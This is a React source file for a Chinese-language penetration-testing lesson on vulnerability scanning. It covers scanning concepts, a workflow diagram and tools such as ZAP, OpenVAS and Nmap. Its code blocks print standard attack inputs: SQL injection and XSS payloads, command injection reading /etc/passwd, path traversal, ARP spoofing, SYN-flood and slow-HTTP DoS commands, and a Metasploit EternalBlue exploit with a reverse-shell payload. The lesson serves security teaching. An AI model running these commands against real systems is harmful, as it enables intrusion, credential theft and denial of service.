'use client'

import LessonLayout, { type LessonMeta } from '@/app/components/ui/book/LessonLayout'
import { THEMES } from '@/app/components/ui/book/theme'
import {
  PageTitle,
  SectionTitle,
  BookParagraph,
  BookCode,
  BookAlert,
  BookList,
  TagGrid,
} from '@/app/components/ui/book/BookContent'

const META: LessonMeta = {
  subject: '网络安全',
  chapterTitle: '漏洞扫描',
  chapterNumber: 3,
  totalChapters: 10,
  subjectHref: '/study/security/penetration',
  prevChapter: { label: '信息收集', href: '/study/security/penetration/recon' },
  nextChapter: { label: '漏洞利用', href: '/study/security/penetration/exploit' },
  theme: THEMES.security,
}

const SPREADS = [
  {
    label: '基础概念',
    left: (
      <div className="space-y-4">
        <PageTitle>漏洞扫描基础概念</PageTitle>
        <BookParagraph>漏洞扫描是渗透测试中的重要环节，通过自动化工具或手动方式对目标系统进行安全漏洞检测。漏洞扫描可以帮助发现系统中存在的安全风险，为后续的漏洞修复提供依据。</BookParagraph>
        <SectionTitle>漏洞扫描的分类</SectionTitle>
        <BookList items={[
          '自动化扫描：使用自动化工具进行扫描。优点：效率高，覆盖面广。缺点：可能存在误报和漏报。适用：大规模系统扫描，可定期执行持续监控。',
          '手动扫描：由安全专家手动进行漏洞检测。优点：准确性高，深度好。缺点：效率较低，成本高。适用：关键系统深度测试，可以发现复杂漏洞。',
        ]} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>漏洞扫描基本流程</PageTitle>
        <div style={{ textAlign: 'center', margin: '16px 0' }}>
          <svg width="700" height="350" viewBox="0 0 700 350">
            <defs>
              <linearGradient id="scgrad" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" style={{ stopColor: '#4F46E5', stopOpacity: 1 }} />
                <stop offset="100%" style={{ stopColor: '#7C3AED', stopOpacity: 1 }} />
              </linearGradient>
              <marker id="scarrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                <polygon points="0 0, 10 3.5, 0 7" fill="#4F46E5" />
              </marker>
            </defs>
            <circle cx="350" cy="175" r="130" fill="none" stroke="#E5E7EB" strokeWidth="2" />
            <g transform="translate(350,175)">
              <g transform="rotate(-45)"><rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#scgrad)" opacity="0.9" /><text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">目标识别</text></g>
              <g transform="rotate(45)"><rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#scgrad)" opacity="0.9" /><text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">漏洞扫描</text></g>
              <g transform="rotate(135)"><rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#scgrad)" opacity="0.9" /><text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">漏洞验证</text></g>
              <g transform="rotate(225)"><rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#scgrad)" opacity="0.9" /><text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">报告生成</text></g>
            </g>
            <path d="M 350 45 L 350 305" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#scarrow)" />
            <path d="M 45 175 L 655 175" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#scarrow)" />
            <circle cx="350" cy="175" r="10" fill="#4F46E5" />
          </svg>
        </div>
        <BookList items={[
          '目标识别：确定扫描范围，收集目标信息，制定扫描策略，准备扫描环境',
          '漏洞扫描：执行自动化扫描，记录扫描结果，初步分析，标记可疑点',
          '漏洞验证：手动验证，漏洞复现确认真实性，风险评估，漏洞分类',
          '报告生成：整理扫描结果，编写漏洞报告，提供修复建议，总结分析',
        ]} />
      </div>
    ),
  },
  {
    label: '漏洞类型',
    left: (
      <div className="space-y-4">
        <PageTitle>Web应用漏洞</PageTitle>
        <SectionTitle>SQL注入</SectionTitle>
        <BookCode language="text" code={`# 基本SQL注入测试
' OR '1'='1
' OR '1'='1' --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --

# 盲注测试
' AND 1=1 --
' AND 1=2 --
' AND (SELECT COUNT(*) FROM users)>0 --`} />
        <SectionTitle>XSS漏洞</SectionTitle>
        <BookCode language="html" code={`<!-- 反射型XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

<!-- 存储型XSS -->
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- DOM型XSS -->
document.write('<img src=x onerror=alert("XSS")>')`} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>系统与网络漏洞</PageTitle>
        <SectionTitle>远程代码执行与权限提升</SectionTitle>
        <BookCode language="bash" code={`# 命令注入
; ls -la
| cat /etc/passwd

# 文件包含
../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php

# SUID提权
find / -perm -4000 -type f 2>/dev/null

# 内核提权
uname -a
searchsploit kernel_version`} />
        <SectionTitle>中间人攻击与拒绝服务</SectionTitle>
        <BookCode language="bash" code={`# ARP欺骗
arpspoof -i eth0 -t 192.168.1.1 192.168.1.2

# SSL剥离
sslstrip -l 8080

# SYN洪水攻击
hping3 -S -p 80 --flood 192.168.1.1

# HTTP慢速攻击
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://target.com -x 24 -p 3`} />
      </div>
    ),
  },
  {
    label: '扫描工具',
    left: (
      <div className="space-y-4">
        <PageTitle>Web应用扫描工具</PageTitle>
        <SectionTitle>OWASP ZAP</SectionTitle>
        <BookCode language="bash" code={`# 启动ZAP
zap.sh

# 命令行扫描
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://example.com

# 自动化扫描
zap-cli spider http://example.com
zap-cli active-scan http://example.com
zap-cli report -o report.html`} />
        <SectionTitle>Burp Suite</SectionTitle>
        <BookParagraph>Web应用测试平台，支持代理拦截和修改请求、漏洞扫描、自动化测试、API测试。</BookParagraph>
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>系统与网络扫描工具</PageTitle>
        <SectionTitle>Nessus / OpenVAS</SectionTitle>
        <BookParagraph>Nessus是商业漏洞扫描器，支持多种漏洞检测、详细报告、自定义策略、合规性检查。</BookParagraph>
        <BookCode language="bash" code={`# 启动OpenVAS
openvas-setup
openvas-start

# 创建扫描任务
omp -u admin -w admin --create-target --name "Target" --hosts 192.168.1.1
omp -u admin -w admin --create-task --name "Scan" --target "Target" --config "Full and fast"`} />
        <SectionTitle>Nmap / Metasploit</SectionTitle>
        <BookCode language="bash" code={`# Nmap漏洞扫描
nmap --script vuln 192.168.1.1

# Metasploit漏洞利用
msf > search type:exploit platform:windows
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.1
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > exploit`} />
      </div>
    ),
  },
  {
    label: '实践案例',
    left: (
      <div className="space-y-4">
        <PageTitle>案例1：Web应用漏洞扫描</PageTitle>
        <BookParagraph>目标：某电商网站</BookParagraph>
        <BookList items={[
          '信息收集：使用OWASP ZAP进行网站爬取，收集所有可访问的URL，识别技术栈',
          '自动化扫描：使用ZAP主动扫描，Burp Suite被动扫描，记录所有发现',
          '漏洞验证：手动验证SQL注入、XSS、CSRF漏洞',
          '报告编写：漏洞描述和复现步骤，风险评估和影响分析，修复建议',
        ]} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>案例2：内网漏洞扫描</PageTitle>
        <BookParagraph>目标：企业内部网络</BookParagraph>
        <BookList items={[
          '网络扫描：使用Nmap进行端口扫描，识别开放服务，检测操作系统类型',
          '漏洞扫描：使用Nessus进行漏洞扫描，Metasploit进行漏洞验证',
          '权限提升：测试本地提权漏洞，检查服务配置错误，验证弱密码问题',
          '横向移动：内网主机扫描，密码哈希获取，远程命令执行',
        ]} />
        <BookAlert type="info" message="漏洞扫描是发现安全风险的重要手段，但自动化扫描存在误报率。所有扫描结果都需要手动验证确认，避免盲目信任自动化工具的输出。" />
      </div>
    ),
  },
]

export default function PenetrationScanPage() {
  return <LessonLayout meta={META} spreads={SPREADS} />
}
